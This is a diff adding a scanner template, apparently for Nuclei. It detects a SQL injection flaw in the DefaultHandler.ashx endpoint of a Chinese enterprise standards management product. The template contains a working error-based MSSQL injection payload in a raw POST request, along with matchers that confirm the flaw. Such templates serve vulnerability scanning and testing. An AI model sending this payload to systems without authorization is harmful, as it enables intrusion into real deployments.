@@ -1,0 +1,30 @@
+id: poc-yaml-runshen-ashx-defaulthandler-sqli
+info:
+  name: 润申信息科技企业标准化管理系统 DefaultHandler.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 润申信息科技企业标准化管理系统
+
+variables:
+  r1: '{{rand_int(1,10000)}}'
+  r2: '{{md5(r1)}}'
+
+http:
+  - raw:
+      - |
+        POST /ashx/DefaultHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{r1}}')),3,32))<0--:
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{r2}}"
